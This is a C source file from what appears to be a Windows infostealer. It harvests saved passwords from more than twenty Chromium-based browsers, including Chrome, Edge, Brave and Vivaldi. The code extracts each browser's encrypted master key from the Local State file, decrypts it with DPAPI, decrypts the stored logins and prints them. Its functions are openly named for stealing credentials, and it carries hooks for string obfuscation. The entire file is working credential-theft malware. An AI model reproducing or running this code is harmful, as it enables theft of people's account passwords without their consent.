// clang-format off
// knownfolders needs to be after shlobj
#include <shlobj.h>
#include <knownfolders.h>
// clang-format on

#include "chromium.h"

#include <dpapi.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <wchar.h>
#include <windows.h>

#include "logins.h"
#include "obfuscation.h"
#include "path.h"

// "DPAPI" is prefixed to the base64 decoded key before encoding
// Meaning we need to remove 5 characters on the key is decoded as it is not
// part of encrypted key
#define DPAPI_KEY_PREFIX_LENGTH 5

// Hardcoded list of chromium browsers, taken from here:
// https://github.com/AlessandroZ/LaZagne/blob/master/Windows/lazagne/softwares/browsers/chromium_browsers.py
// With Opera, Opera GX, SogouExplorer and Yandex removed as they they need
// special handling

// Retreive an encoded (base64) and encrypted (AES-GCM) from the JSON file at
// `localStatePath`
// NOTE: `encodedKeyOut` must be freed by the caller
static int retrieve_encoded_key(PWSTR localStatePath, PSTR *encodedKeyOut) {
  HANDLE fileHandle =
      CreateFileW(localStatePath, GENERIC_READ, FILE_SHARE_READ, NULL,
                  OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
  if (fileHandle == INVALID_HANDLE_VALUE) {
    printf("Failed to open file. Error code: %lu\n", GetLastError());
    return EXIT_FAILURE;
  }

  DWORD fileSize = GetFileSize(fileHandle, NULL);
  if (fileSize == INVALID_FILE_SIZE) {
    printf("Failed to get file size. Error code: %lu\n", GetLastError());
    CloseHandle(fileHandle);
    return EXIT_FAILURE;
  }

  // characters in the file are encoded in UTF-8, no need for wide characters
  PSTR fileBuffer = (PSTR)malloc(fileSize + 1);
  if (!fileBuffer) {
    printf("Failed to allocate memory for file buffer.\n");
    CloseHandle(fileHandle);
    return EXIT_FAILURE;
  }

  DWORD bytesRead;
  if (!ReadFile(fileHandle, fileBuffer, fileSize * sizeof(char), &bytesRead,
                NULL)) {
    printf("Failed to read file. Error code: %lu\n", GetLastError());
    free(fileBuffer);
    CloseHandle(fileHandle);
    return EXIT_FAILURE;
  }
  CloseHandle(fileHandle);

  fileBuffer[fileSize] = '\0';

  // Search for the "encryped_key:" attribute
  const char *key = "\"encrypted_key\":";
  PSTR cursor = strstr(fileBuffer, key);
  if (!cursor) {
    free(fileBuffer);
    return EXIT_FAILURE;
  }

  // skip the key
  cursor += strlen(key);
  // skip whitespace and the beginning quote
  while (*cursor == ' ' || *cursor == '\t' || *cursor == '"') {
    cursor++;
  }

  // keep start position of the encrypted key
  PSTR start = cursor;
  // cursor now points to the end of the encrypted key (to get the length)
  while (*cursor != '"') {
    cursor++;
  }

  size_t length = cursor - start;
  *encodedKeyOut = (PSTR)malloc(length + 1);
  if (!*encodedKeyOut) {
    free(fileBuffer);
    return EXIT_FAILURE;
  }

  strncpy(*encodedKeyOut, start, length);
  (*encodedKeyOut)[length] = '\0';

  free(fileBuffer);
  return EXIT_SUCCESS;
}

// Decodes a base64 `encodedKey` (also cleans the key) into `decodedKeyOut`,
// note that `decodedKeyOut` is still encrypted at this point
// NOTE: `decodedKeyOut` must be freed by the caller
static int decode_key(PSTR encodedKey, BYTE *decodedKeyOut[],
                      size_t *decodedKeySizeOut) {
  // Get size of the decoded key (needed for the next malloc)
  DWORD decodedBinarySize = 0;
  if (!CryptStringToBinaryA(encodedKey, 0, CRYPT_STRING_BASE64, NULL,
                            &decodedBinarySize, NULL, NULL)) {
    fprintf(stderr, "Failed getting base64 size. Error code: %lu\n",
            GetLastError());
    return EXIT_FAILURE;
  }

  BYTE *decodedBinaryData = (BYTE *)malloc(decodedBinarySize);
  if (decodedBinaryData == NULL) {
    fprintf(stderr, "Failed allocating memory\n");
    return EXIT_FAILURE;
  }

  // Decode the encoded key, this leaves us with an AES-GCM encrypted key
  if (!CryptStringToBinaryA(encodedKey, 0, CRYPT_STRING_BASE64,
                            decodedBinaryData, &decodedBinarySize, NULL,
                            NULL)) {
    fprintf(stderr, "Failed decoding base64. Error code: %lu\n",
            GetLastError());
    free(decodedBinaryData);
    return EXIT_FAILURE;
  }

  // Remove the first five bytes (corresponding to "DPAPI") as they are not part
  // of the key
  size_t newSize = decodedBinarySize - DPAPI_KEY_PREFIX_LENGTH;
  memmove(decodedBinaryData, decodedBinaryData + DPAPI_KEY_PREFIX_LENGTH,
          newSize);

  *decodedKeyOut = (BYTE *)realloc(decodedBinaryData, newSize);
  if (*decodedKeyOut == NULL) {
    fprintf(stderr, "Failed reallocating memory\n");
    free(decodedBinaryData);
    return EXIT_FAILURE;
  }

  *decodedKeySizeOut = newSize;

  return EXIT_SUCCESS;
}

// Decrypts `encryptedKey` of size `encryptedKeySize` using DPAPI
// NOTE: `decryptedKeyOut` must be freed by the caller
static int decrypt_key(BYTE encryptedKey[], size_t encryptedKeySize,
                       DATA_BLOB *decryptedKeyOut) {
  DATA_BLOB DataInput;
  DATA_BLOB DataOutput;

  DataInput.cbData = (DWORD)encryptedKeySize;
  DataInput.pbData = encryptedKey;

  if (!CryptUnprotectData(&DataInput, NULL, NULL, NULL, NULL, 0, &DataOutput)) {
    fprintf(stderr, "Failed decrypting key. Error code: %lu\n", GetLastError());
    free(encryptedKey);
    return EXIT_FAILURE;
  }

  decryptedKeyOut->cbData = DataOutput.cbData;
  decryptedKeyOut->pbData = DataOutput.pbData;

  // we could free encryptedKey here but I rather leave it to the original
  // caller
  // free(encryptedKey);
  return EXIT_SUCCESS;
}

// Steals credentials for a singular `browser`
static int steal_browser_creds(BrowserInfo browser) {
  // login data contains each logins with the password encrypted and other
  // attributes in clear text

  // Deobfuscate browser strings
  // wcslen() is the equivalent of strlen() for wide strings
  // XOR_WSTR(browser.browserName, wcslen(browser.browserName));
  // xor_wstr(browser.browserName, wcslen(browser.browserName));
  // xor_wstr(browser.loginDataPath, wcslen(browser.loginDataPath));
  // xor_wstr(browser.localStatePath, wcslen(browser.localStatePath));
  wprintf(L"Browser name = %ls\n", browser.browserName);

  PWSTR loginDataPath;
  if (get_logindata_path(browser.loginDataPath, &loginDataPath) !=
      EXIT_SUCCESS) {
    fwprintf(stderr, L"Unable to get login data PATH for %s\n",
             browser.browserName);
    return EXIT_FAILURE;
  }

  wprintf(L"=== Now stealing %ls credentials ===\n", browser.browserName);

  Login *logins = NULL;
  int loginsCount = 0;
  if (chrmm_retrieve_logins(loginDataPath, &loginsCount, &logins) !=
      EXIT_SUCCESS) {
    fprintf(stderr, "Could not retrieve logins from the database\n");
    return EXIT_FAILURE;
  }

  // local state contains and encoded and decrypted key that once decrypted
  // can decrypt a logins password with AES-GCM
  PWSTR localStatePath;
  if (get_localstate_path(browser.localStatePath, &localStatePath) !=
      EXIT_SUCCESS) {
    fwprintf(stderr, L"Unable to get local state PATH for %s\n",
             browser.browserName);
    return EXIT_FAILURE;
  }

  PSTR encodedKey;
  if (retrieve_encoded_key(localStatePath, &encodedKey) != EXIT_SUCCESS) {
    wprintf(L"Could not retrieve key from %s\n", localStatePath);
    return EXIT_FAILURE;
  }

  size_t encryptedKeySize = 0;
  BYTE *encryptedKey;
  if (decode_key(encodedKey, &encryptedKey, &encryptedKeySize) !=
      EXIT_SUCCESS) {
    printf("Could not decode %s\n", encodedKey);
    return EXIT_FAILURE;
  }

  DATA_BLOB decryptedBlob;
  if (decrypt_key(encryptedKey, encryptedKeySize, &decryptedBlob) !=
      EXIT_SUCCESS) {
    fprintf(stderr, "Could not decrypt key\n");
    return EXIT_FAILURE;
  }

  Credential *credentials = NULL;
  int credentialsCount = 0;
  if (chrmm_decrypt_logins(logins, loginsCount, decryptedBlob.pbData,
                           &credentials, &credentialsCount) != EXIT_SUCCESS) {
    printf("Failed to decrypt chromium logins\n");
  }

  for (int i = 0; i < credentialsCount; i++) {
    printf("======LOGIN %d======\n", i + 1);
    printCredential(credentials[i]);
  }
  printf("====================\n");

  free_credentials(credentials, credentialsCount);
  free_logins(logins, loginsCount);  // allocated in chrmm_retrieve_logins
  LocalFree(decryptedBlob.pbData);   // allocated in decrypt_key
  free(encodedKey);                  // allocated in retrieve_encoded_key
  free(encryptedKey);                // allocated in decode_key
  free(localStatePath);              // allocated in get_localstate_path
  free(loginDataPath);               // allocated in get_logindata_path

  return EXIT_SUCCESS;
}

int steal_chromium_creds() {
  BrowserInfo browsers[] = {
      {L"7Star", L"\\7Star\\7Star\\User Data\\Default\\Login Data",
       L"\\7Star\\7Star\\User Data\\Local State"},
      {L"Amigo", L"\\Amigo\\User Data\\Default\\Login Data",
       L"\\Amigo\\User Data\\Local State"},
      {L"Brave",
       L"\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data",
       L"\\BraveSoftware\\Brave-Browser\\User Data\\Local State"},
      {L"CentBrowser", L"\\CentBrowser\\User Data\\Default\\Login Data",
       L"\\CentBrowser\\User Data\\Local State"},
      {L"Chedot", L"\\Chedot\\User Data\\Default\\Login Data",
       L"\\Chedot\\User Data\\Local State"},
      {L"Chrome Beta", L"\\Google\\Chrome Beta\\User Data\\Default\\Login Data",
       L"\\Google\\Chrome Beta\\User Data\\Local State"},
      {L"Chrome Canary",
       L"\\Google\\Chrome SxS\\User Data\\Default\\Login Data",
       L"\\Google\\Chrome SxS\\User Data\\Local State"},
      {L"Chromium", L"\\Chromium\\User Data\\Default\\Login Data",
       L"\\Chromium\\User Data\\Local State"},
      {L"Microsoft Edge", L"\\Microsoft\\Edge\\User Data\\Default\\Login Data",
       L"\\Microsoft\\Edge\\User Data\\Local State"},
      {L"CocCoc", L"\\CocCoc\\Browser\\User Data\\Default\\Login Data",
       L"\\CocCoc\\Browser\\User Data\\Local State"},
      {L"Comodo Dragon", L"\\Comodo\\Dragon\\User Data\\Default\\Login Data",
       L"\\Comodo\\Dragon\\User Data\\Local State"},
      {L"Elements Browser",
       L"\\Elements Browser\\User Data\\Default\\Login Data",
       L"\\Elements Browser\\User Data\\Local State"},
      {L"DCBrowser", L"\\DCBrowser\\User Data\\Default\\Login Data",
       L"\\DCBrowser\\User Data\\Local State"},
      {L"Epic Privacy Browser",
       L"\\Epic Privacy Browser\\User Data\\Default\\Login Data",
       L"\\Epic Privacy Browser\\User Data\\Local State"},
      {L"Google Chrome", L"\\Google\\Chrome\\User Data\\Default\\Login Data",
       L"\\Google\\Chrome\\User Data\\Local State"},
      {L"Kometa", L"\\Kometa\\User Data\\Default\\Login Data",
       L"\\Kometa\\User Data\\Local State"},
      {L"Orbitum", L"\\Orbitum\\User Data\\Default\\Login Data",
       L"\\Orbitum\\User Data\\Local State"},
      {L"QQBrowser", L"\\Tencent\\QQBrowser\\User Data\\Default\\Login Data",
       L"\\Tencent\\QQBrowser\\User Data\\Local State"},
      {L"Sputnik", L"\\Sputnik\\Sputnik\\User Data\\Default\\Login Data",
       L"\\Sputnik\\Sputnik\\User Data\\Local State"},
      {L"Torch", L"\\Torch\\User Data\\Default\\Login Data",
       L"\\Torch\\User Data\\Local State"},
      {L"Uran", L"\\uCozMedia\\Uran\\User Data\\Default\\Login Data",
       L"\\uCozMedia\\Uran\\User Data\\Local State"},
      {L"Vivaldi", L"\\Vivaldi\\User Data\\Default\\Login Data",
       L"\\Vivaldi\\User Data\\Local State"},
  };

  for (int i = 0; i < sizeof(browsers) / sizeof(BrowserInfo); i++) {
    if (steal_browser_creds(browsers[i]) != EXIT_SUCCESS) {
      fwprintf(stderr, L"Unable to find credentials for %s. Continuing...\n",
               browsers[i].browserName);
    }
  }
  return EXIT_SUCCESS;
}
